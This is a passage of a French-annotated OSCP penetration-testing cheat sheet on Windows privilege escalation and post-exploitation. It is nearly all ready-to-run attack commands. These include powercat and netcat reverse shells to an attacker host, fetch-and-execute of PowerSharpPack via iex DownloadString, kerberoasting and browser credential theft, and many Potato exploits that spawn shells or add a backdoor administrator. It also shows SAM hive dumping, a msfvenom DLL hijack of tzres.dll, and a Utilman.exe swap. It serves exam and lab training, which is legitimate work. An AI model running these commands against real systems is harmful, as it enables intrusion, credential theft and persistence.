.\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe
```


```powershell
.\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]
```


```powershell
.\powercat.ps1 -c [TARGET_IP] -p [PORT] -s
```


### PowerView


<p class="oscp-command-note">Script PowerShell dans la rubrique « PowerView ».</p>

```powershell
.\PowerView.ps1
# Autre possibilité
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
```


```powershell
.\PowerView.ps1 -Command "Get-NetUser"
```


```powershell
.\PowerView.ps1 -Command 'Get-NetGroup -GroupName "Domain Admins"'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetUser -SPN'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetDomainController'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetShare'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetUser -Delegation'
```


### PowerMad




```powershell
.\PowerMad.ps1
```


```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup"
```


```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup" | Out-File -FilePath powermad_output.txt
```


### PrivescCheck




```powershell
.\PrivescCheck.ps1
```


```powershell
.\PrivescCheck.ps1
```


```powershell
.\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt
```


### Seatbelt




```powershell
.\Seatbelt.exe
```


#### Setup


<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
cd PowerSharpPack
```




```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```


**Paramètres et repères :**
`-Command`  




```powershell
PowerSharpPack -seatbelt -Command "AMSIProviders"
```


#### Included Tools and Code Examples




```powershell
PowerSharpPack -InternalMonologue
```


```powershell
PowerSharpPack -seatbelt -Command "AMSIProviders"
```


```powershell
PowerSharpPack -SharpWeb
```


```powershell
PowerSharpPack -UrbanBishop
```


```powershell
PowerSharpPack -SharpUp
```


```powershell
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
```


```powershell
PowerSharpPack -SharPersist -Command "Persist"
```


```powershell
PowerSharpPack -SharpView -Command "Get-Domain"
```


```powershell
PowerSharpPack -winPEAS
```


```powershell
PowerSharpPack -SharpChromium
```


#### Standalone Scripts


**Paramètres et repères :**
`PowerSharpBinaries`  




```powershell
PowerSharpPack -SharpCloud
```


```powershell
PowerSharpPack -SharpGPOAbuse
```


```powershell
PowerSharpPack -SauronEye
```


#### Complémentaire Tools




```powershell
PowerSharpPack -SharpShares
```


```powershell
PowerSharpPack -SharpSniper
```


```powershell
PowerSharpPack -SharpSpray
```


```powershell
PowerSharpPack -Grouper2
```


```powershell
PowerSharpPack -Watson
```


#### Execution Tips




```powershell
PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"
```


**Paramètres et repères :**
`PowerSharpBinaries`  


## Potatoes


<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>

```text
whoami /priv
```


**Paramètres et repères :**
`winPEAS`  




```text
NT AUTHORITY\SYSTEM
```


**Paramètres et repères :**
`PrintSpoofer`  


### DCOMPotato




```bash
DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"
```


```bash
DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
DCOMPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### EfsPotato




```bash
EfsPotato.exe "C:\Windows\System32\cmd.exe"
```


```bash
EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
EfsPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### GodPotato




```bash
GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
```


```bash
GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
GodPotato.exe -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Hot Potato (CVE-2016-3225)




```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"
```


```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Juicy Potato




```bash
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
```


```bash
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### PrintSpoofer




```bash
PrintSpoofer.exe -c whoami
```


```bash
PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
PrintSpoofer.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Rogue Potato




```bash
RoguePotato.exe -r [ATTACKER_IP] -e whoami
```


```bash
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### RottenPotato


**Paramètres et repères :**
`RottenPotato.exe`  


### SharpEfsPotato


<p class="oscp-command-note">Script shell dans la rubrique « SharpEfsPotato ».</p>

```bash
SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"

# Example
SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "whoami | Set-Content C:\temp\w.log"
```


```bash
SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe"
# Autre possibilité
SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [port]"
```


```bash
# Creates the new user
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "user emma Password123 /add"

# Adds the user to the Administrators group
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrators emma /add"
```


### SigmaPotato




```bash
SigmaPotato.exe cmd.exe /c whoami
```


```bash
SigmaPotato.exe --revshell [ATTACKER_IP] 4444
```


```bash
# Creates the new user
SigmaPotato.exe cmd.exe /c "net user emma Password123 /add"

# Adds it as admin
SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
```


### SweetPotato




```bash
SweetPotato.exe -a whoami
```


```bash
SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
SweetPotato.exe -a "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### CVE-2023-29360


**Paramètres et repères :**
`CVE-2023-29360.exe`  


<p class="oscp-command-note">Afficher les processus actifs.</p>

```powershell
PS C:\Users\emma\Desktop> whoami
redteam\emma

PS C:\Users\emma\Desktop> .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\emma\Desktop> whoami
nt authority\system
```


### SeAssignPrimaryToken


**Paramètres et repères :**
`SeImpersonate` · `JuicyPotato` · `RoguePotato`  




```powershell
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
```


```powershell
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```powershell
# Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```




```powershell
RoguePotato.exe -r [kali_ip] -e whoami
```


```powershell
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]"
```


```powershell
# Creates the new user
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### SeBackup


**Paramètres et repères :**
`SeBackupPrivilege`  


<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -system system -sam sam local
```


### SeDebug


**Paramètres et repères :**
`SeDebugPrivesc.exe`  


<p class="oscp-command-note">Afficher les processus actifs.</p>

```powershell
ps
```




```powershell
.\SeDebugPrivesc.exe <PID> <Program and Arguments>
```


### SeImpersonate


**Paramètres et repères :**
`Disabled`  


### SeManageVolumeAbuse




```text
C:\
```


**Paramètres et repères :**
`.dll`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\</code></p>


**Paramètres et repères :**
`SeManageVolumeExploit.exe`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>


<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```text
systeminfo
```


```powershell
whoami /priv
```

![Checking for SeManageVolume privilege.](https://www.emmanuelsolis.com/img/semanage_1.png)


**Paramètres et repères :**
`SeManageVolume`  




```powershell
.\SeManageVolumeExploit.exe
```

![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
```


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
```

![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>


<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```text
systeminfo
```


```powershell
systeminfo
```

![Triggering the payload for a reverse shell.](https://www.emmanuelsolis.com/img/semanage_4.png)


### SeRestore


**Paramètres et repères :**
`utilman.exe` · `SeRestoreAbuse.exe`  


<p class="oscp-command-note">Changer de répertoire.</p>

```powershell
cd C:\Windows\system32

ren Utilman.exe Utilman.old
```




```powershell
ren cmd.exe Utilman.exe
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>

```powershell
# Lock the computer
Windows + L

# Connect via RDP in a way that request for credentials in the Windows screen
rdesktop [ip]
```




```text
nt authority\system
```




```powershell
# Once in the Windows Login Screen press
Windows + U
```


**Paramètres et repères :**
`SerestoreAbuse.exe`  


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>

```powershell
# (Option 1) Netcat direct reverse shell
.\SeRestoreAbuse.exe "C:\temp\nc.exe [attacker_ip] [port] -e powershell.exe"

# (Option 2) Payload reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali_ip] LPORT=[port] -f exe -o payload.exe
.\SeRestoreAbuse.exe C:\temp\payload.exe
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
